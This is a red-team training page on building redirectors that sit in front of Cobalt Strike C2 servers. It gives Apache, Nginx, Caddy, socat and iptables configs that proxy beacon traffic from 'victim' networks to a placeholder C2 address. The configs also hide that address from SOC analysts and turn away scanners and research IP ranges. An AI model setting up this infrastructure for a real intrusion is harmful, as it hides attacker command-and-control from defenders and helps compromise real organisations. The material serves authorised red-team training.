---
layout: training-page
title: "Redirector Architecture & Setup — Red Team Academy"
module: "Infrastructure Engineering"
tags:
  - infrastructure
  - redirectors
  - apache
  - nginx
  - c2
page_key: "infrastructure-redirector-setup"
render_with_liquid: false
---

# Redirector Architecture & Setup

Redirectors are the firewall between your C2 infrastructure and the defenders analyzing the victim network. A correctly configured redirector absorbs all scrutiny — when an SOC analyst burns the redirector IP, your C2 server and remaining infrastructure are untouched.

## Purpose and Design Goals

```
What a redirector does:
  1. Accept inbound connections from victim environment
  2. Inspect the request (URI, headers, user-agent)
  3. If the request matches a valid beacon signature: forward to C2
  4. If the request does NOT match: return innocuous content (200 OK, redirect, 404)

What a redirector must NOT do:
  - Reveal the C2 server IP in any response header, redirect target, or error page
  - Respond to health checks in a way that fingerprints it as a C2 redirector
  - Allow direct connections from non-operator IPs on management ports
```

## Apache mod_rewrite Redirector

Apache with mod_rewrite is the most documented and flexible redirector option.

### Install Apache

```bash
# Ubuntu/Debian
apt update && apt install -y apache2

# Enable required modules
a2enmod rewrite proxy proxy_http ssl headers

# Disable default site
a2dissite 000-default.conf

systemctl restart apache2
```

### Cobalt Strike Redirector (mod_rewrite)

The malleable C2 profile defines the URI, headers, and patterns the beacon uses. The redirector must pass those specific requests.

```apache
# /etc/apache2/sites-enabled/redirector.conf

<VirtualHost *:443>
    ServerName cdn-update.yourdomain.com
    SSLEngine On
    SSLCertificateFile /etc/letsencrypt/live/cdn-update.yourdomain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/cdn-update.yourdomain.com/privkey.pem

    # Remove Apache server banner
    ServerSignature Off
    Header unset X-Powered-By
    Header always set Server "nginx"

    # Log all requests for analysis
    CustomLog /var/log/apache2/redirector_access.log combined
    ErrorLog  /var/log/apache2/redirector_error.log

    RewriteEngine On

    # Block known scanner/researcher user agents
    RewriteCond %{HTTP_USER_AGENT} "curl|wget|python-requests|Shodan|Masscan|zgrab" [NC]
    RewriteRule .* https://www.microsoft.com/en-us/ [R=302,L]

    # Block known security research IPs (populate from threat intel)
    # RewriteCond %{REMOTE_ADDR} "^23\.20\." [NC]
    # RewriteRule .* - [F,L]

    # Forward valid Cobalt Strike beacon traffic
    # Match on URI patterns defined in malleable profile
    RewriteCond %{REQUEST_URI} ^/updates/? [NC,OR]
    RewriteCond %{REQUEST_URI} ^/jquery-3\.3\.1\.min\.js [NC,OR]
    RewriteCond %{REQUEST_URI} ^/____cfduid [NC]
    RewriteRule ^(.*)$ https://[C2_IP]/$1 [P,L]

    # Anything else → redirect to legitimate site (appears as CDN or cloud)
    RewriteRule .* https://www.microsoft.com%{REQUEST_URI} [R=302,L]

</VirtualHost>
```

### Advanced Filtering: Header and User-Agent Checks

```apache
# More granular beacon verification using headers
# Cobalt Strike with malleable profile sets custom headers

<VirtualHost *:443>
    ServerName updates.yourdomain.com
    SSLEngine On
    SSLCertificateFile /etc/letsencrypt/live/updates.yourdomain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/updates.yourdomain.com/privkey.pem

    RewriteEngine On

    # Only forward if beacon sends correct custom header
    # Header name and value defined in malleable C2 profile
    RewriteCond %{HTTP:X-Custom-Header} "BeaconAuth-Token-Value" [NC]
    RewriteCond %{REQUEST_URI} ^/api/v2/ [NC]
    RewriteRule ^(.*)$ https://[C2_IP]:443$1 [P,L]

    # Strip X-Forwarded-For to avoid leaking redirector IP
    RequestHeader set X-Forwarded-For %{REMOTE_ADDR}s

    # Everything else → benign response
    RewriteRule .* /index.html [L]

</VirtualHost>
```

### Proxy Configuration (Hide C2 IP)

```bash
# Enable mod_proxy_http (required for P flag in RewriteRule)
a2enmod proxy proxy_http

# In VirtualHost config, add:
ProxyRequests Off
ProxyPreserveHost Off   # CRITICAL: prevents Host header from revealing C2 domain

# SSL verification on backend (C2) connection
SSLProxyEngine On
SSLProxyVerify none     # Only if C2 uses self-signed cert
SSLProxyCheckPeerCN Off
SSLProxyCheckPeerName Off
```

## Nginx Stream Proxy with Conditional Routing

```nginx
# /etc/nginx/sites-available/redirector.conf

upstream c2_backend {
    server [C2_IP]:443;
    keepalive 16;
}

map $http_user_agent $bad_agent {
    default           0;
    "~*curl"          1;
    "~*wget"          1;
    "~*python"        1;
    "~*Shodan"        1;
    "~*masscan"       1;
    "~*nmap"          1;
    "~*zgrab"         1;
}

server {
    listen 443 ssl;
    server_name cdn-service.yourdomain.com;

    ssl_certificate     /etc/letsencrypt/live/cdn-service.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn-service.yourdomain.com/privkey.pem;

    # Hide nginx version
    server_tokens off;

    # Block bad agents
    if ($bad_agent) {
        return 302 https://www.google.com/;
    }

    # Forward valid beacon URIs to C2
    location ~ ^/(jquery|api|updates|cdn)/ {
        proxy_pass https://[C2_IP];
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        
        # Don't expose backend server
        proxy_hide_header X-Powered-By;
        proxy_hide_header Server;
        add_header Server "cloudflare";
    }

    # Default: return innocuous content
    location / {
        return 200 "<!DOCTYPE html><html><body><p>Service Unavailable</p></body></html>";
        add_header Content-Type text/html;
    }

    access_log /var/log/nginx/redirector.access.log;
    error_log  /var/log/nginx/redirector.error.log;
}
```

## Caddy as Redirector

Caddy provides automatic HTTPS via Let's Encrypt and a clean configuration syntax.

```
# /etc/caddy/Caddyfile

cdn-update.yourdomain.com {
    # Caddy handles TLS automatically

    # Conditional routing via header check
    @beacon {
        path /api/v2/*
        header X-Auth-Token BeaconValue123
    }

    handle @beacon {
        reverse_proxy https://[C2_IP] {
            transport http {
                tls_insecure_skip_verify
            }
            header_up Host {http.request.host}
            header_up -X-Auth-Token   # Strip beacon header before forwarding
        }
    }

    # Block known scanner user agents
    @scanners {
        header User-Agent *curl*
        header User-Agent *wget*
        header User-Agent *python*
        header User-Agent *Shodan*
    }
    handle @scanners {
        redir https://www.microsoft.com 302
    }

    # Default handler
    handle {
        respond "Service Unavailable" 503
    }

    log {
        output file /var/log/caddy/redirector.log
    }
}
```

## Filtering Logic Deep Dive

### User-Agent Whitelisting

Instead of blacklisting bad UAs, whitelist expected beacon UAs:

```apache
# Only forward requests with expected user agent
# Define expected UA in malleable profile (e.g., Chrome on Windows)
RewriteCond %{HTTP_USER_AGENT} "^Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit" [NC]
RewriteCond %{REQUEST_URI} ^/api/
RewriteRule ^(.*)$ https://[C2_IP]$1 [P,L]

# All other UAs → redirect
RewriteRule .* https://www.google.com/ [R=302,L]
```

### URI Pattern Matching

```apache
# Match only URIs defined in your malleable profile
# Example: Cobalt Strike with jquery profile

RewriteCond %{REQUEST_URI} ^/jquery-3\.3\.1\.min\.js [NC,OR]
RewriteCond %{REQUEST_URI} ^/____________cfduid [NC,OR]
RewriteCond %{REQUEST_URI} ^/jquery\.js [NC]
RewriteRule ^(.*)$ https://[C2_IP]:443$1 [P,L]
```

### Header Checks for High Assurance

```apache
# Require a specific combination of URI + header + user-agent
# Makes automated scanning essentially impossible to match

RewriteCond %{HTTP_USER_AGENT} "^Mozilla/5\.0 \(Windows NT" [NC]
RewriteCond %{HTTP:Referer} "^https://www\.google\.com" [NC]
RewriteCond %{REQUEST_URI} ^/news/
RewriteRule ^(.*)$ https://[C2_IP]$1 [P,L]
```

## Socat for Simple TCP Port Forwarding

```bash
# Install socat
apt install socat

# Basic TCP forwarding: all traffic on port 443 → C2
socat TCP-LISTEN:443,fork TCP:[C2_IP]:443 &

# Background with logging
nohup socat -d -d TCP-LISTEN:443,reuseaddr,fork TCP:[C2_IP]:443 \
  >> /var/log/socat.log 2>&1 &

# As systemd service
cat > /etc/systemd/system/socat-redirector.service << EOF
[Unit]
Description=Socat TCP Redirector

[Service]
ExecStart=/usr/bin/socat TCP-LISTEN:443,reuseaddr,fork TCP:[C2_IP]:443
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable socat-redirector
systemctl start socat-redirector
```

**Limitation**: Socat does no filtering — passes all traffic including scanners. Use only as last resort or when Apache/Nginx are unavailable.

## Iptables Redirector

```bash
# Raw port forwarding via iptables NAT
# Useful as backup when application-layer redirector is unavailable

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Forward all traffic on port 443 to C2
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination [C2_IP]:443
iptables -t nat -A POSTROUTING -j MASQUERADE

# Log forwarded connections (optional — generates logs of all beacon connections)
iptables -A FORWARD -p tcp --dport 443 -j LOG --log-prefix "REDIR: " --log-level 4

# Persist across reboots
apt install iptables-persistent
netfilter-persistent save
```

## IP Allowlisting for Management

```bash
# UFW management access — operator IPs only
ufw reset
ufw default deny incoming
ufw default allow outgoing

# Allow operator VPN IP for SSH management
ufw allow from [OPERATOR_VPN_IP] to any port 22

# Allow inbound from victim networks on redirect port
ufw allow 443/tcp
ufw allow 80/tcp

# Block management ports from internet
ufw deny 22/tcp    # Default deny then allow specific source above

ufw enable
```

## Redirector Hardening

```bash
# 1. Remove default server banner (Apache)
echo "ServerTokens Prod" >> /etc/apache2/conf-enabled/security.conf
echo "ServerSignature Off" >> /etc/apache2/conf-enabled/security.conf

# 2. Block common scanner IPs (update regularly from threat intel)
# /etc/apache2/conf-enabled/blocklist.conf
cat > /etc/apache2/conf-enabled/blocklist.conf << 'EOF'
<RequireAll>
    Require all granted
    # Block Shodan crawlers
    Require not ip 198.20.69.0/24
    Require not ip 198.20.70.0/24
    Require not ip 198.20.99.0/24
    # Block Censys
    Require not ip 162.142.125.0/24
    Require not ip 167.248.133.0/24
</RequireAll>
EOF

# 3. Disable unnecessary Apache modules
a2dismod status autoindex info
systemctl restart apache2

# 4. Enable fail2ban for SSH brute force protection
apt install fail2ban
systemctl enable fail2ban

# 5. Disable password SSH authentication
sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart ssh
```

## Testing Redirector Configuration

```bash
# Test from operator machine: beacon URI should forward to C2
curl -sk -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  https://cdn-update.yourdomain.com/api/v2/data

# Test: scanner UA should get redirected
curl -sk -H "User-Agent: curl/7.68.0" \
  https://cdn-update.yourdomain.com/api/v2/data
# Expected: 302 redirect to microsoft.com

# Test: random URI should get innocuous response
curl -sk https://cdn-update.yourdomain.com/randompath
# Expected: 302 or 200 with innocuous content

# Test: verify C2 IP does not appear in response headers
curl -sI https://cdn-update.yourdomain.com/api/v2/data | grep -i location
# Should NOT contain C2 IP

# Test beacon through redirector chain (Cobalt Strike)
# In Cobalt Strike team server: verify beacon checks in through redirector
# View: Cobalt Strike > Targets — should show beacon alive

# Monitor redirector log for beacon traffic
tail -f /var/log/apache2/redirector_access.log | \
  grep -v "302\|scanner\|curl\|wget"
```

## Redirector Log Analysis

```bash
# Count requests by URI (identify what's being probed)
awk '{print $7}' /var/log/apache2/redirector_access.log | sort | uniq -c | sort -rn | head 20

# Identify top source IPs (potential scanners)
awk '{print $1}' /var/log/apache2/redirector_access.log | sort | uniq -c | sort -rn | head 20

# Filter for beacon traffic (200 OK proxied through)
grep " 200 " /var/log/apache2/redirector_access.log | \
  awk '{print $1, $7, $9}' | tail -50

# Identify requests that hit redirect rule (302) — these are scanners
grep " 302 " /var/log/apache2/redirector_access.log | wc -l
```
